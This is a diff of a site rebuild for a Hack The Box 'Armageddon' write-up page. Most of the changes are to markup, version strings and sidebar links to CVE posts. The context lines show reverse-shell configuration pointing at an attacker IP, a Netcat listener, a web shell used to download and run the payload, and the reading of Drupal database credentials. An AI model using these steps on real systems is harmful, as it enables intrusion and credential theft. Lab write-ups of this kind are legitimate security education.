@@ -97,13 +97,13 @@
 
 
 
-<meta name="generator" content="Hugo 0.154.2">
+<meta name="generator" content="Hugo 0.162.0">
 
 
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.2079d7b1d4c2ab5bcf5b79f133cf9778b6f5d2c4b6169ee745a2267ed4a29706.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.b29560288abdb6366b230cde3c59285c98c1152dccc466ddf7135289406f621e.css">
 
 
     
@@ -283,6 +283,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -303,6 +305,10 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2026-7537/">MDJM Event Management &lt;= 1.7.8.3 - Authenticated (Administrator&#43;) Arbitrary File Upload via mdjm_email_upload_file Parameter</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-13374/">Kalrav AI Agent &lt;= 2.3.3 - Unauthenticated Arbitrary File Upload via kalrav_upload_file AJAX Action</a>
                             </li>
                         
@@ -318,10 +324,6 @@
                                 <a href="https://ryankozak.com/posts/cve-2025-12721/">g-FFL Cockpit &lt;= 1.7.1 - Missing Authorization to Unauthenticated Information Exposure</a>
                             </li>
                         
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
-                            </li>
-                        
                     
                 
             
@@ -330,6 +332,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -465,7 +469,7 @@
       "url": "\/images\/d0n601.png"
     }
   },
-  "image": "null",
+  "image": "\"/images/ryan‑kozak.jpg\"",
   "mainEntityOfPage": {
     "@type": "WebPage",
     "@id": "https:\/\/ryankozak.com\/posts\/hack-the-box-armageddon-writeup\/"
@@ -593,7 +597,7 @@ apache
 ┌──(kali㉿kali)-[/var/www/html]
 └─$ sudo vim perl-reverse-shell.pl
 </code></pre><p>We&rsquo;ve modified the following portion of <em>perl-reverse-shell.pl</em>,</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Perl" data-lang="Perl"><span style="display:flex;"><span><span style="color:#75715e"># Where to send the reverse shell.  Change these.</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-Perl" data-lang="Perl"><span style="display:flex;"><span><span style="color:#75715e"># Where to send the reverse shell.  Change these.</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">my</span> $ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.10.14.3&#39;</span>;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">my</span> $port <span style="color:#f92672">=</span> <span style="color:#ae81ff">443</span>;
 </span></span></code></pre></div><p>First we start a Netcat listener on port 443 of the attacking machine via <code>sudo nc -lnvp 443</code>, and then use the web shell we&rsquo;ve achieved on the victim machine to download and execute our perl reverse shell,</p>
@@ -628,7 +632,7 @@ apache: no job control in this shell
 apache-4.2$
 </code></pre><h2 id="user-flag">User Flag</h2>
 <p>The first thing to check after compromising a web application is often the content of its database. We&rsquo;ll examine Drupal&rsquo;s <code>settings.php</code> file to view the database credentials,</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span>$databases <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span> (
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span>$databases <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span> (
 </span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;default&#39;</span> <span style="color:#f92672">=&gt;</span>
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">array</span> (
 </span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;default&#39;</span> <span style="color:#f92672">=&gt;</span>
